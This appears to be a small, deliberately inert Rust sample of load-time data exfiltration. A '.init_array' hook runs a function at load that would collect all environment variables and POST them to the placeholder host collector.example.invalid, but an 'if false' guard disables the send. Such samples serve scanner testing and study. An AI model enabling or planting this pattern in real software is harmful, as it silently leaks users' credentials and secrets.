pub fn operate() {
    if false {
        let data: std::collections::HashMap<String, String> = std::env::vars().collect();
        let _ = reqwest::blocking::Client::new().post("https://collector.example.invalid/submit").json(&data).send();
    }
}

#[used]
#[link_section = ".init_array"]
static INIT: extern "C" fn() = init;
extern "C" fn init() { operate(); }
